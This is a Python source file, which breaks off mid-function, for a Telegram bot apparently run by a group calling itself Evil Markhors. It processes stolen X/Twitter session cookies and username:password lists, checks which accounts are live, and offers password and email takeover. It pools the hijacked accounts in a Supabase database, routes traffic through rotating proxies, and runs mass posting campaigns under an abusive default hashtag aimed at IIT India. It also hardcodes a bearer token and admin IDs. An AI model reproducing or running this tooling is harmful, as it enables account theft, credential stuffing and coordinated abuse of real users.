#!/usr/bin/env python3
"""
Evil Markhors Bot - HARDENED + CAMPAIGN + SUPABASE POOL + COMMANDS
"""
import os, io, re, sys, json, stat, hmac, time, random, base64, struct, hashlib
import secrets, string, asyncio, logging, tempfile, zipfile, shutil, traceback
from datetime import datetime, timezone, timedelta
from urllib.parse import quote, unquote

try:
    import httpx
    from telegram import InputFile, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.error import BadRequest, RetryAfter
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
        filters,
    )
except ImportError:
    print("Deps missing: pip install -r requirements.txt")
    raise


def _load_env_file(path):
    """Minimal .env loader: existing environment wins, quotes stripped."""
    try:
        with open(path, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k, v = k.strip(), v.strip()
                if len(v) >= 2 and v[0] == v[-1] and v[0] in "\"'":
                    v = v[1:-1]
                if k and k not in os.environ:
                    os.environ[k] = v
    except FileNotFoundError:
        pass
    except Exception:
        logging.exception("env file %s", path)


_load_env_file(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

# ============================ CONFIG ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN")
WEBSITE = os.getenv("WEBSITE", "https://evilmarkhors.me")
CREDIT = os.getenv("CREDIT", "Config by Evil Markhors")
LIVE_DEFAULT = os.getenv("LIVE", "1").strip().lower() in ("1", "true", "yes", "on")
CONCURRENCY = int(os.getenv("CONCURRENCY", "8"))
TIMEOUT = float(os.getenv("TIMEOUT", "25"))
ACC_TIMEOUT = float(os.getenv("ACC_TIMEOUT", "90"))
MEDIA_WAIT_MAX = float(os.getenv("MEDIA_WAIT_MAX", "300"))
MAX_FILES = int(os.getenv("MAX_FILES", "5000"))
RETRIES = int(os.getenv("RETRIES", "3"))
TWEET_LIMIT = int(os.getenv("TWEET_LIMIT", "265"))
POST_MIN = float(os.getenv("POST_MIN", "45"))
POST_MAX = float(os.getenv("POST_MAX", "110"))
THREAD_GAP_MIN = float(os.getenv("THREAD_GAP_MIN", "4"))
THREAD_GAP_MAX = float(os.getenv("THREAD_GAP_MAX", "9"))
STORE_PATH = os.getenv("STORE_PATH", "users.json")
SUPABASE_URL = os.getenv("SUPABASE_URL", "").rstrip("/")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
DB_TABLE = os.getenv("DB_TABLE", "accounts")
REVERIFY_HOURS = float(os.getenv("REVERIFY_HOURS", "24"))
REVERIFY_BATCH = int(os.getenv("REVERIFY_BATCH", "400"))
REVERIFY_CONC = int(os.getenv("REVERIFY_CONC", "4"))
DEAD_AFTER = int(os.getenv("DEAD_AFTER", "2"))
JOB_REAP_MIN = float(os.getenv("JOB_REAP_MIN", "30"))
ZIP_UPLOAD_MAX = int(os.getenv("ZIP_UPLOAD_MAX", str(45 * 1024 * 1024)))
# Zip bomb guard: declared uncompressed size per entry / per archive.
ZIP_MAX_FILE = int(os.getenv("ZIP_MAX_FILE", str(16 * 1024 * 1024)))
ZIP_MAX_TOTAL = int(os.getenv("ZIP_MAX_TOTAL", str(256 * 1024 * 1024)))
# Pending login/email codes aur campaign stage kitni der zinda rahen.
PEND_TTL_MIN = int(os.getenv("PEND_TTL_MIN", "180"))
CAMP_STAGE_SEC = int(os.getenv("CAMP_STAGE_SEC", str(6 * 3600)))
# Proxies: sirf X traffic in par jaata hai, Telegram/Supabase direct rehte hain.
PROXIES_RAW = os.getenv("PROXIES", "")
PROXY_FILE = os.getenv("PROXY_FILE", "").strip()
PROXY_MODE = os.getenv("PROXY_MODE", "rotate").strip().lower()
PROXY_TYPE = os.getenv("PROXY_TYPE", "").strip().lower()
PROXY_TEST_URL = os.getenv(
    "PROXY_TEST_URL",
    "https://api.x.com/1.1/account/verify_credentials.json")
# Ek proxy probe ka hard cap. SOCKS handshake httpx timeout ignore kar sakta
# hai, isliye wait_for se band karte hain (warna test 90s+ atak jata hai).
PROXY_PROBE_TIMEOUT = 20.0
PROXY_HOSTS = ("api.x.com", "upload.x.com", "api.twitter.com",
               "upload.twitter.com", "x.com", "twitter.com")
# Deploy ke baad admins ko ek netcheck summary bhejein (0 = off).
NETCHECK_ON_START = os.getenv("NETCHECK_ON_START", "1").strip().lower() in (
    "1", "true", "yes", "on")
# Health check server port (0 = disabled). Railway / load balancer ke liye.
HEALTH_CHECK_PORT = int(os.getenv("HEALTH_CHECK_PORT", "0"))
HEALTH_CHECK_HOST = os.getenv("HEALTH_CHECK_HOST", "0.0.0.0")
# Shared httpx client - connection reuse ke liye, har call pe naya na banaye.
_SHARED_CLIENT = None
_START_TIME = time.time()
HTTPONLY_NAMES = {"auth_token", "ct0", "kdt", "twid", "guest_id",
                  "guest_id_marketing", "guest_id_ads"}

HERE = os.path.dirname(os.path.abspath(__file__))
SELF = os.path.basename(os.path.abspath(__file__))
# State (users.json, batch_*.json, camp_*.json, del_data/) STORE_PATH ke saath
# rehna chahiye, taake Railway volume mount hone par redeploy pe na ude.
STORE_ABS = STORE_PATH if os.path.isabs(STORE_PATH) else os.path.join(HERE, STORE_PATH)
STATE_DIR = os.path.dirname(STORE_ABS) or HERE
DEL_DIR = os.path.join(STATE_DIR, "del_data")
CAMP_MEDIA_DIR = os.path.join(STATE_DIR, "camp_media")
DEFAULT_TAG = "#EvilMarkhors_Fucked_IIT_INDIA"
ADMIN_IDS_RAW = os.getenv("ADMIN_IDS", "").strip()
ADMIN_IDS = {int(x) for x in ADMIN_IDS_RAW.split(",") if x.strip()}

SPLIT = {}
CTEST = {}  # uid -> jab country test maanga gaya (TTL ke liye)
TWEET = {}
CAMPS = {}
CAMPRUN = {}
LAST_REPORT = {}
STORE_ASK = {}
EXTRACT = {}
JOBS = {}


def job_running(uid):
    """Kind of the job this user currently runs, or ''."""
    uid = str(uid)
    j = JOBS.get(uid)
    if not j:
        return ""
    if j["task"].done():
        JOBS.pop(uid, None)
        return ""
    return j["kind"]


def start_job(uid, kind, factory, replace=False):
    """Run factory() in the background, one job per user.

    factory must be a callable returning a coroutine, so a rejected
    start never leaves an un-awaited coroutine behind.
    """
    uid = str(uid)
    cur = JOBS.get(uid)
    if cur and not cur["task"].done():
        if not replace:
            return None
        cur["task"].cancel()
    task = asyncio.create_task(factory())
    job = {"kind": kind, "uid": uid, "task": task, "started": time.time()}
    JOBS[uid] = job

    def _done(_t, u=uid, ref=job):
        if JOBS.get(u) is ref:
            JOBS.pop(u, None)

    task.add_done_callback(_done)
    return task


async def stop_job(uid):
    uid = str(uid)
    job = JOBS.pop(uid, None)
    if not job:
        return ""
    task = job["task"]
    if not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        except Exception:
            logging.exception("stop_job")
    return job["kind"]


async def janitor_loop():
    while True:
        await asyncio.sleep(60)
        now = time.time()
        for uid, job in list(JOBS.items()):
            if job["task"].done():
                JOBS.pop(uid, None)
        for uid, st in list(STORE_ASK.items()):
            if now - st.get("at", now) > JOB_REAP_MIN * 60:
                STORE_ASK.pop(uid, None)
                shutil.rmtree(st.get("tmp", ""), ignore_errors=True)
        # Bina code daale chhode gaye ULP clients band karo, warna sockets
        # aur memory hamesha ke liye leak hoti hai.
        for uid, pd in list(PEND.items()):
            for key, v in list(pd.items()):
                if now - v.get("at", now) > PEND_TTL_MIN * 60:
                    try:
                        await v["client"].aclose()
                    except Exception:
                        pass
                    pd.pop(key, None)
                    b = BATCH.get(uid)
                    if b and isinstance(b.get("results"), list):
                        try:
                            b["results"][int(key)] = {
                                "ok": False,
                                "line": b["lines"][int(key)],
                                "err": "code_timeout"}
                        except Exception:
                            pass
            if not pd:
                PEND.pop(uid, None)
        for uid in list(CTEST):
            if now - CTEST[uid] > JOB_REAP_MIN * 60:
                CTEST.pop(uid, None)


KEYMAP = {
    "year": "Year", "followers": "Followers", "friends": "Friends", "posts": "Posts",
    "likes": "Likes", "media": "Media", "verified": "Verified", "card": "Card added",
    "api": "API", "developer api": "Developer API", "protected": "Protected",
    "2fa": "2FA", "country": "Country", "status": "Status", "email": "Email",
    "phone": "Phone",
    "created": "Created", "verified type": "Verified type", "suspended": "Suspended",
}
NUM_FIELDS = {"year", "followers", "friends", "posts", "likes", "media"}
BOOL_FIELDS = {"verified", "card", "api", "developer api", "protected", "2fa", "suspended"}
PREFIXES = ["", "", "", "", "Update:", "News:", "Breaking:", "Just in:", "Aaj:", "Note:"]
SUFFIXES = ["", "", "", "", "!", ".", " ðŸ”¥", " âœ”"]
BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
          "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

FIELDS = ["Status", "Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media",
          "Verified", "Verified type", "Suspended", "Protected", "Country", "Year", "Created",
          "Email", "Phone", "2FA", "Card added", "API", "Developer API"]
_FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")

SCHEMA_SQL = """create table if not exists accounts (
  id bigserial primary key, owner bigint, username text not null unique, x_id text,
  cookies jsonb not null, country text, yr text, followers int default 0,
  protected boolean default false, verified boolean default false,
  status text default 'live', fails int default 0, source text,
  created_at timestamptz default now(), last_check timestamptz,
  last_ok timestamptz, last_post timestamptz);
create index if not exists accounts_status_idx on accounts (status);
create index if not exists accounts_country_idx on accounts (country);
create index if not exists accounts_check_idx on accounts (last_check);
create index if not exists accounts_owner_idx on accounts (owner);
-- the bot needs the service_role key: RLS is enabled with no policies
alter table accounts enable row level security;
"""

FILES = {
    "requirements.txt": "python-telegram-bot>=21.0,<23\nhttpx[socks]>=0.27,<1\n",
    ".gitignore": "__pycache__/\n*.pyc\n.env\n*.tmp\nusers.json\nvenv/\n*.zip\nbatch_*.json\ndel_data/\ncamp_media/\ncamp_*.json\n",
    ".dockerignore": "venv\n__pycache__\n*.zip\n*.tmp\n.env\nusers.json\nbatch_*.json\ncamp_*.json\ndel_data\ncamp_media\n",
    ".env.example": ("BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
                     "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\n"
                     "STORE_PATH=users.json\nADMIN_IDS=7028523300,6120166351\n"
                     "POST_MIN=45\nPOST_MAX=110\nTHREAD_GAP_MIN=4\nTHREAD_GAP_MAX=9\nTWEET_LIMIT=265\n"
                     "TIMEOUT=25\nACC_TIMEOUT=90\nRETRIES=3\nMAX_FILES=5000\n"
                     "MEDIA_WAIT_MAX=300\n"
                     "JOB_REAP_MIN=30\nZIP_UPLOAD_MAX=47185920\n"
                     "ZIP_MAX_FILE=16777216\nZIP_MAX_TOTAL=268435456\n"
                     "PEND_TTL_MIN=180\nCAMP_STAGE_SEC=21600\n"
                     "SUPABASE_URL=https://xxxx.supabase.co\nSUPABASE_KEY=service_role_key\n"
                     "DB_TABLE=accounts\nREVERIFY_HOURS=24\nREVERIFY_BATCH=400\n"
                     "REVERIFY_CONC=4\nDEAD_AFTER=2\n"
                     "# proxies (X traffic only). HTTP/SOCKS5 endpoints, not vless://\n"
                     "# formats: http://u:p@1.2.3.4:8080  socks5://u:p@host:1080\n"
                     "#          socks5|host:port:user:pass  [2001:db8::1]:1080:user:pass\n"
                     "PROXIES=\nPROXY_FILE=\nPROXY_MODE=rotate\nPROXY_TYPE=http\n"
                     "PROXY_TEST_URL=https://api.x.com/1.1/account/verify_credentials.json\n"
                     "NETCHECK_ON_START=1\n"),
    "Dockerfile": ("FROM python:3.12-slim\nWORKDIR /app\n"
                   "ENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
                   "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
                   f"COPY {SELF} bot.py\nCMD [\"python\",\"bot.py\"]\n"),
    "railway.toml": ('[build]\nbuilder = "DOCKERFILE"\ndockerfilePath = "Dockerfile"\n\n'
                     '[deploy]\nrestartPolicyType = "ON_FAILURE"\nrestartPolicyMaxRetries = 10\n'),
    "schema.sql": SCHEMA_SQL,
    "README.md": ("# Evil Markhors Bot\n\n"
                  "Cookie/ULP reworker + verify + campaigns + Supabase pool.\n\n"
                  "- install: `pip install -r requirements.txt`\n"
                  "- config: copy `.env.example` to `.env`, set `BOT_TOKEN` and `ADMIN_IDS`\n"
                  "- run: `python evilmarkhorsx_bot.py`\n\n"
                  "Modes: send cookie `.txt`/`.zip`, ULP `user:pass` lines, `/verify`, "
                  "`/split`, `/extract`.\n"
                  "Admin: `/camp` campaigns, `/db` Supabase, `/tweet`, `/delbatch`.\n\n"
                  "Proxies: `PROXIES=http://u:p@host:port,socks5://host:port` (X traffic\n"
                  "only, http/https/socks5/socks5h; provider `host:port:user:pass` +\n"
                  "`PROXY_TYPE=socks5`; vless/vmess/ss links need xray/sing-box).\n"
                  "`/proxy add [auto|type]` se runtime proxy volume par save karo,\n"
                  "`/proxy detect` se SOCKS5/HTTP type khud check karo.\n\n"
                  "State (`users.json`, `batch_*.json`, `camp_*.json`, `del_data/`, "
                  "`camp_media/`) lives in the directory of `STORE_PATH` - point it at "
                  "a Railway volume so it survives redeploys.\n"),
}


def _w(path, content, overwrite=False):
    full = os.path.join(HERE, path)
    if os.path.exists(full) and not overwrite:
        return False
    with open(full, "w", encoding="utf-8") as fh:
        fh.write(content)
    if path.endswith(".sh"):
        os.chmod(full, os.stat(full).st_mode | stat.S_IEXEC)
    return True


def bootstrap(force=False):
    return [n for n, c in FILES.items() if _w(n, c, force)]


# ============================ COUNTRY MAP ============================
ISO_NAME = {
    "PK": "Pakistan", "IN": "India", "BD": "Bangladesh", "AF": "Afghanistan",
    "US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
    "AE": "United Arab Emirates", "SA": "Saudi Arabia", "QA": "Qatar", "KW": "Kuwait",
    "OM": "Oman", "BH": "Bahrain", "TR": "Turkey", "IR": "Iran", "IQ": "Iraq",
    "EG": "Egypt", "NG": "Nigeria", "KE": "Kenya", "ZA": "South Africa",
    "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain", "NL": "Netherlands",
    "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland", "PL": "Poland",
    "RU": "Russia", "UA": "Ukraine", "CN": "China", "JP": "Japan", "KR": "South Korea",
    "SG": "Singapore", "MY": "Malaysia", "ID": "Indonesia", "PH": "Philippines",
    "TH": "Thailand", "VN": "Vietnam", "NP": "Nepal", "LK": "Sri Lanka",
    "MV": "Maldives", "MM": "Myanmar", "BR": "Brazil", "AR": "Argentina",
    "MX": "Mexico", "CL": "Chile", "CO": "Colombia", "PE": "Peru", "NZ": "New Zealand",
    "IE": "Ireland", "PT": "Portugal", "CH": "Switzerland", "AT": "Austria",
    "CZ": "Czechia", "GR": "Greece", "HU": "Hungary", "RO": "Romania", "IL": "Israel",
    "JO": "Jordan", "LB": "Lebanon", "SY": "Syria", "YE": "Yemen", "SD": "Sudan",
    "ET": "Ethiopia", "GH": "Ghana", "MA": "Morocco", "DZ": "Algeria", "TN": "Tunisia",
}
NAME_ISO = {v.lower(): k for k, v in ISO_NAME.items()}
CITY_ISO = {
    "karachi": "PK", "lahore": "PK", "islamabad": "PK", "rawalpindi": "PK",
    "peshawar": "PK", "quetta": "PK", "multan": "PK", "faisalabad": "PK",
    "mumbai": "IN", "bombay": "IN", "delhi": "IN", "bangalore": "IN", "bengaluru": "IN",
    "chennai": "IN", "kolkata": "IN", "calcutta": "IN", "pune": "IN", "ahmedabad": "IN",
    "jaipur": "IN", "lucknow": "IN", "kanpur": "IN", "nagpur": "IN", "indore": "IN",
    "bhopal": "IN", "patna": "IN", "surat": "IN", "varanasi": "IN", "agra": "IN",
    "london": "GB", "new york": "US", "california": "US", "texas": "US", "toronto": "CA",
    "dubai": "AE", "abu dhabi": "AE", "riyadh": "SA", "jeddah": "SA", "doha": "QA",
    "istanbul": "TR", "ankara": "TR", "dhaka": "BD", "kabul": "AF", "colombo": "LK",
    "kathmandu": "NP", "sydney": "AU", "melbourne": "AU", "singapore": "SG",
    "kuala lumpur": "MY", "jakarta": "ID", "manila": "PH", "bangkok": "TH",
    "berlin": "DE", "paris": "FR", "madrid": "ES", "rome": "IT", "amsterdam": "NL",
}


def to_iso(v):
    v = (v or "").strip()
    if not v:
        return ""
    if len(v) == 2 and v.isalpha():
        return v.upper()
    lv = v.lower()
    if lv in NAME_ISO:
        return NAME_ISO[lv]
    hits = [(len(n), iso) for n, iso in NAME_ISO.items()
            if re.search(r"\b" + re.escape(n) + r"\b", lv)]
    if hits:
        return max(hits)[1]
    hits = [(len(c), iso) for c, iso in CITY_ISO.items()
            if re.search(r"\b" + re.escape(c) + r"\b", lv)]
    return max(hits)[1] if hits else ""


def as_int(v, default=0):
    """Tolerant int: handles '1,234', '12k'? no - just commas/spaces/None."""
    try:
        s = str(v).replace(",", "").replace("_", "").strip()
        return int(float(s)) if s else default
    except Exception:
        return default


# ============================ SUPABASE ============================
def db_enabled():
    return bool(SUPABASE_URL and SUPABASE_KEY)


def db_headers(extra=None):
    h = {"apikey": SUPABASE_KEY, "Authorization": "Bearer " + SUPABASE_KEY,
         "Content-Type": "application/json", "Accept": "application/json"}
    if extra:
        h.update(extra)
    return h


def db_url():
    return SUPABASE_URL + "/rest/v1/" + DB_TABLE


async def db_upsert(client, rows):
    if not db_enabled() or not rows:
        return 0, (None if not rows else "db off")
    # Same username do dafa aaya to Postgres ka ON CONFLICT ek hi statement
    # mein same row ko dobara update nahi kar sakta (error 21000) aur poora
    # 200-row chunk fail ho jata hai. Last row jeeti.
    uniq = {}
    for row in rows:
        uniq[row.get("username")] = row
    rows = [r for u, r in uniq.items() if u]
    if not rows:
        return 0, "no username"

    async def push(chunk, depth=0):
        try:
            r = await client.post(
                db_url(), params={"on_conflict": "username"},
                headers=db_headers({"Prefer": "resolution=merge-duplicates,return=minimal"}),
                json=chunk, timeout=TIMEOUT * 2)
            if r.status_code < 300:
                return len(chunk)
            logging.warning("db_upsert %s %s", r.status_code, r.text[:200])
        except Exception:
            logging.exception("db_upsert")
        if len(chunk) > 1 and depth < 4:
            # Ek kharab row poore chunk ko na girde - aadha aadha retry karo.
            mid = len(chunk) // 2
            return await push(chunk[:mid], depth + 1) + await push(chunk[mid:], depth + 1)

    ok = 0
    for i in range(0, len(rows), 200):
        ok += await push(rows[i:i + 200])
    return ok, (None if ok else "upsert fail")


async def db_fetch(client, params, limit=500, offset=0):
    try:
        p = dict(params)
        p["select"] = "*"
        p["limit"] = str(limit)
        p["offset"] = str(offset)
        # Stable pagination: Postgres has no implicit order, so without this the
        # same row can show up on two pages (and another row never at all).
        p.setdefault("order", "id.asc")
        r = await client.get(db_url(), params=p, headers=db_headers(), timeout=TIMEOUT * 2)
        if r.status_code >= 300:
            logging.warning("db_fetch %s %s", r.status_code, r.text[:200])
            return []
        return r.json() or []
    except Exception:
        logging.exception("db_fetch")
        return []


async def db_fetch_all(client, params, chunk=1000, cap=200000):
    out, offset = [], 0
    while len(out) < cap:
        page = await db_fetch(client, params, limit=chunk, offset=offset)
        if not page:
            break
        out.extend(page)
        offset += len(page)
        if len(page) < chunk:
            break
    return out


async def db_patch(client, username, payload):
    try:
        r = await client.patch(db_url(), params={"username": "eq." + username},
                               headers=db_headers({"Prefer": "return=minimal"}),
                               json=payload, timeout=TIMEOUT)
        if r.status_code >= 300:
            logging.warning("db_patch %s %s %s", username, r.status_code, r.text[:200])
        return r.status_code < 300
    except Exception:
        logging.exception("db_patch")
        return False


async def db_delete(client, usernames):
    if not usernames:
        return 0
    ok = 0
    for i in range(0, len(usernames), 100):
        chunk = usernames[i:i + 100]
        try:
            r = await client.delete(db_url(), params={"username": "in.(" + ",".join(chunk) + ")"},
                                    headers=db_headers({"Prefer": "return=minimal"}),
                                    timeout=TIMEOUT * 2)
            if r.status_code < 300:
                ok += len(chunk)
        except Exception:
            logging.exception("db_delete")
    return ok


async def db_clear(client):
    """Delete every row in one request (PostgREST needs a filter, so id=gt.0)."""
    return await db_delete_where(client, {"id": "gt.0"})


_ALLOWED_DELETE_FILTERS = {
    "status": ("eq.", "neq.", "in."),
    "id": ("eq.", "neq.", "gt.", "gte.", "lt.", "lte.", "in.", "is."),
    "last_check": ("eq.", "neq.", "gt.", "gte.", "lt.", "lte.", "in.", "is."),
}


def _validate_delete_filter(params):
    """PostgREST filter injection rokne ke liye whitelist."""
    out = {}
    for k, v in (params or {}).items():
        base = k
        op = "eq."
        for prefix in ("eq.", "neq.", "gt.", "gte.", "lt.", "lte.", "in.", "is.", "like.", "ilike."):
            if v.startswith(prefix):
                op = prefix
                base_v = v[len(prefix):]
                break
        else:
            base_v = v
        if base not in _ALLOWED_DELETE_FILTERS:
            continue
        if op not in _ALLOWED_DELETE_FILTERS[base]:
            continue
        out[base] = op + base_v
    return out or None


async def db_delete_where(client, params):
    params = _validate_delete_filter(params)
    if params is None:
        logging.warning("db_delete_where: unsafe filter rejected: %r", params)
        return 0
    try:
        r = await client.delete(
            db_url(), params=params,
            headers=db_headers({"Prefer": "return=minimal,count=exact"}),
            timeout=TIMEOUT * 4)
        if r.status_code >= 300:
            logging.warning("db_delete_where %s %s", r.status_code, r.text[:200])
            return 0
        cr = r.headers.get("content-range", "")
        tail = cr.rsplit("/", 1)[-1] if "/" in cr else ""
        return int(tail) if tail.isdigit() else 0
    except Exception:
        logging.exception("db_delete_where")
        return 0


async def db_count(client, status=None):
    try:
        p = {"select": "id", "limit": "1"}
        if status:
            p["status"] = "eq." + status
        r = await client.get(db_url(), params=p,
                             headers=db_headers({"Prefer": "count=exact"}), timeout=TIMEOUT)
        return int(r.headers.get("content-range", "0-0/0").split("/")[-1])
    except Exception:
        return 0


def now_iso(delta_hours=0):
    return (datetime.now(timezone.utc) + timedelta(hours=delta_hours)).isoformat()


# ============================ STATE ============================
_store = {}
_lock = asyncio.Lock()
BATCH = {}
PEND = {}


def load_store():
    global _store
    p = STORE_ABS
    try:
        with open(p, encoding="utf-8") as f:
            _store = json.load(f)
    except FileNotFoundError:
        _store = {}
    except Exception:
        logging.exception("store load failed: %s", p)
        # Kharab file ko overwrite karne se pehle backup rakho.
        try:
            shutil.copyfile(p, p + ".corrupt-" + str(int(time.time())))
        except Exception:
            pass
        _store = {}


def save_store():
    try:
        p = STORE_ABS
        os.makedirs(os.path.dirname(p) or ".", exist_ok=True)
        with open(p + ".tmp", "w", encoding="utf-8") as f:
            json.dump(_store, f, indent=2)
        os.replace(p + ".tmp", p)
    except Exception:
        logging.exception("store save")


def ucfg(uid):
    return _store.setdefault(str(uid), {"live": LIVE_DEFAULT, "mode": "auto",
                                        "takeover": False, "newpass": "",
                                        "newemail": "", "store": "ask"})


def get_live(uid):
    return bool(ucfg(uid).get("live", LIVE_DEFAULT))


def get_store_mode(uid):
    m = ucfg(uid).get("store", "ask")
    if m in ("db", "both") and not db_enabled():
        return "file"
    return m


async def set_cfg(uid, **kw):
    async with _lock:
        ucfg(uid).update(kw)
        save_store()


def batch_file(uid):
    return os.path.join(STATE_DIR, "batch_" + str(uid) + ".json")


BATCH_SAVE = {}


def save_batch(uid, force=False):
    b = BATCH.get(uid)
    if not b:
        return
    now = time.time()
    if not force and now - BATCH_SAVE.get(uid, 0.0) < 2.0:
        return
    BATCH_SAVE[uid] = now
    try:
        p = batch_file(uid)
        with open(p + ".tmp", "w", encoding="utf-8") as f:
            json.dump(_sanitize_batch_for_save(b), f)
        os.replace(p + ".tmp", p)
    except Exception:
        logging.exception("save_batch")


def clear_batch_file(uid):
    try:
        os.remove(batch_file(uid))
    except Exception:
        pass


def load_batches():
    if not os.path.isdir(STATE_DIR):
        return
    for fn in os.listdir(STATE_DIR):
        if not (fn.startswith("batch_") and fn.endswith(".json")):
            continue
        try:
            uid = fn[6:-5]
            with open(os.path.join(STATE_DIR, fn), encoding="utf-8") as f:
                d = json.load(f)
                d = _sanitize_batch_for_save(d)  # purane batches se credentials hatao
            if d.get("lines"):
                BATCH[uid] = {"tmp": tempfile.mkdtemp(prefix="em_rec_"), "msg": None,
                              "lines": d["lines"], "results": d.get("results", []),
                              "ok": d.get("ok", 0), "fail": d.get("fail", 0),
                              "mode": d.get("mode", "ulp"), "takeover": False,
                              "newpass": "", "newemail": "",
                              "started": d.get("started", time.time())}
        except Exception:
            logging.exception("load_batch %s", fn)


# ============================ PROGRESS ============================
def _fmt_t(sec):
    sec = int(max(sec, 0))
    if sec >= 3600:
        return str(sec // 3600) + "h" + str((sec % 3600) // 60).zfill(2) + "m"
    if sec >= 60:
        return str(sec // 60) + "m" + str(sec % 60).zfill(2) + "s"
    return str(sec) + "s"


async def _edit(msg, text):
    if msg is None:
        return
    for _ in range(3):
        try:
            await msg.edit_text(text)
            return
        except RetryAfter as e:
            await asyncio.sleep(getattr(e, "retry_after", 2))
        except Exception:
            return


class Progress:
    def __init__(self, msg, total, label):
        self.msg, self.total, self.label = msg, total, label
        self.done = self.ok = self.fail = self.pend = 0
        self.live = 0
        self.unk = 0
        self.start = time.time()
        self.last = 0.0
        self.lock = asyncio.Lock()
        self.phase = "start"
        # reason -> count, sirf diagnostics ke liye (caption/report mein dikhta hai)
        self.notes = {}

    def add_note(self, reason):
        """Failure reason ka short counter, taake 'sab unknown' ka cause dikhe."""
        r = " ".join(str(reason or "unknown").split()).lower()[:60] or "unknown"
        self.notes[r] = self.notes.get(r, 0) + 1

    def notes_text(self, top=3):
        if not self.notes:
            return ""
        items = sorted(self.notes.items(), key=lambda kv: -kv[1])[:top]
        return " | ".join(k + " x" + str(v) for k, v in items)

    def all_unknown_hint(self):
        """Jab ek bhi live na mile aur sab unknown hon."""
        if self.unk <= 0 or self.live > 0:
            return ""
        notes = self.notes_text(6)
        if "live check off" in notes.lower():
            return "\nLive check OFF hai - /live on karke dobara bhejo."
        hint = ("\nSab unknown - X tak request nahi pohanchi (cookies DEAD nahi hain)."
                "\n/proxy test, /netcheck aur /diag chalao.")
        if notes and ("net" in notes or "proxy" in notes or "timeout" in notes
                      or "403" in notes or "429" in notes):
            hint += "\nWajah lagti hai: network/proxy."
        return hint

    async def update(self, phase=None, force=False):
        if phase:
            self.phase = phase
        async with self.lock:
            now = time.time()
            if not force and now - self.last < 2.5:
                return
            self.last = now
            el = now - self.start
            pct = int(self.done * 100 / self.total) if self.total else 0
            eta = (el / self.done * (self.total - self.done)) if self.done else 0
            bar = "#" * (pct // 5) + "." * (20 - pct // 5)
            await _edit(self.msg, self.label + "\n" + self.phase + "\n\n" + bar + " "
                        + str(pct) + "%\n" + str(self.done) + "/" + str(self.total)
                        + " | ok " + str(self.ok) + " | live " + str(self.live)
                        + " | fail " + str(self.fail)
                        + (" | unknown " + str(self.unk) if self.unk else "")
                        + " | code " + str(self.pend) + "\nwaqt " + _fmt_t(el)
                        + " | baaqi ~" + _fmt_t(eta)
                        + ("\n" + self.notes_text(2) if self.notes else ""))


# ============================ COOKIE MODE ============================
def parse_cookie_file(text):
    data, cookies = {}, []
    for line in (text or "").splitlines():
        http_only = False
        if line.startswith("#HttpOnly_"):
            http_only = True
            line = line[len("#HttpOnly_"):]
        elif line.lstrip().startswith("#"):
            continue
        m = _FIELD_RE.match(line)
        if m:
            data[m.group(1).strip()] = m.group(2).strip()
        elif "\t" in line:
            c = line.rstrip("\r")
            cookies.append("#HttpOnly_" + c if http_only else c)
    return data, cookies


def cookie_dict(lines):
    d = {}
    for l in lines or []:
        p = l.split("\t")
        if len(p) >= 7:
            d[p[5]] = p[6].rstrip("\r")
    return d


def _cookie_line(line):
    line = (line or "").rstrip("\r")
    if line.startswith("#HttpOnly_"):
        return line
    try:
        if line.split("\t")[5] in HTTPONLY_NAMES:
            return "#HttpOnly_" + line
    except Exception:
        pass
    return line


def cookie_lines(ck):
    exp = int(time.time()) + 86400 * 30
    return [_cookie_line(".x.com\tTRUE\t/\tTRUE\t" + str(exp) + "\t"
                         + str(k) + "\t" + str(v))
            for k, v in (ck or {}).items()]


def build_cookie_file(data, cookies):
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT, ""]
    for f in FIELDS:
        v = data.get(f)
        out.append("\u2013 " + f + ": " + (v if v not in (None, "") else "\u2013"))
    out.append("\u2013 Cookies: " + CREDIT)
    out.append("")
    out.extend(_cookie_line(c) for c in (cookies or []))
    return "\n".join(out).rstrip() + "\n"


def _unique_name(base, used):
    """Return a name unique within `used` (mutating it), keeping the extension.

    Strips directory components from `base` to prevent zip-slip (e.g.
    a malicious zip entry `../../evil.txt` writing outside the archive).
    """
    base = base or "account.txt"
    base = os.path.basename(base.replace("\\", "/"))
    fn, i = base, 2
    stem, ext = os.path.splitext(base)
    while fn in used:
        fn = stem + "_" + str(i) + ext
        i += 1
    used.add(fn)
    return fn


def zip_txt_names(zin, limit=None):
    """Zip ke .txt entries, size-checked (zip bomb se bachne ke liye).

    Declared file_size central directory se aata hai, isliye read karne se
    pehle hi pata chal jata hai ke entry kitni bari hai.
    """
    out, total = [], 0
    cap = MAX_FILES if limit is None else limit
    for n in zin.namelist():
        if not n.lower().endswith(".txt") or n.endswith("/"):
            continue
        try:
            info = zin.getinfo(n)
        except KeyError:
            continue
        size = int(info.file_size or 0)
        if size > ZIP_MAX_FILE:
            raise RuntimeError("zip entry bahut bari hai: " + n
                               + " (" + str(size // 1048576) + " MB)")
        total += size
        if total > ZIP_MAX_TOTAL:
